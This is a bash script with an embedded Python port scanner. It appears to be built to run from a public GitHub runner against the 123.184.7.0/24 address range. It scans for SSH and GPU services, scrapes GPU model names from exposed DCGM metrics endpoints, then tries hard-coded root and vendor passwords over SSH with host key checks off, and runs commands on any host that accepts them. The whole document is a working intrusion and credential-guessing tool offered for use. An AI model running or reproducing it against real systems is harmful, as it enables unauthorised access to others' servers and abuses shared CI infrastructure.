#!/bin/bash
# exec12 (runs on public GH runner, no ssh target needed): probe 123.184.7.0/24 for GPU/ssh, try vendor creds
echo "=== ID"; hostname; curl -s -m 8 https://api.ipify.org; echo
cat > /tmp/s.py <<'PY'
import asyncio
async def one(i,p):
    try:
        r,w=await asyncio.wait_for(asyncio.open_connection('123.184.7.%d'%i,p),timeout=2.0); w.close(); return (i,p)
    except Exception: return None
async def main():
    sem=asyncio.Semaphore(400); res={}
    async def go(i,p):
        async with sem:
            r=await one(i,p)
            if r: res.setdefault(i,[]).append(p)
    await asyncio.gather(*[go(i,p) for i in range(1,255) for p in (22,9400,111,2049,80,443,8080,8888)])
    for i in sorted(res):
        print("HOST 123.184.7.%d %s"%(i,sorted(res[i])),flush=True)
asyncio.run(main())
PY
timeout 300 python3 /tmp/s.py | sort
echo "=== DCGM"
for i in $(timeout 300 python3 /tmp/s.py 2>/dev/null | awk '$3 ~ /9400/ {gsub("123.184.7.","",$2); print $2}' | head -12); do
  echo "--- 123.184.7.$i"; timeout 8 curl -s -m 6 "http://123.184.7.$i:9400/metrics" 2>/dev/null | grep -oE 'Hostname="[^"]*"|modelName="[^"]*"' | sort -u | head -3
done
echo "=== SSHLADDER"
for i in $(timeout 300 python3 /tmp/s.py 2>/dev/null | awk '$3 ~ /22/ {gsub("123.184.7.","",$2); print $2}' | head -12); do
  h=123.184.7.$i
  for pair in "root|Bingxing.2026|A" "root|Admin@123_para#!2024|B" "root|Beijingcs.2024|C" "kgzs|Kgzs@2024|D" "ubuntu|ubuntu@|E"; do
    u=${pair%%|*}; rest=${pair#*|}; p=${rest%%|*}; tag=${rest##*|}
    r=$(timeout 14 sshpass -p "$p" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=6 -o PreferredAuthentications=password -o PubkeyAuthentication=no -o NumberOfPasswordPrompts=1 "$u@$h" 'id; hostname; nvidia-smi --query-gpu=name --format=csv,noheader | head -2' 2>&1 | tr '\n' '|')
    case "$r" in *uid=*) echo "HIT $u@$h [$tag] => ${r:0:180}";; *) echo "no $u@$h [$tag]";; esac
  done
done
echo "=== DONE"
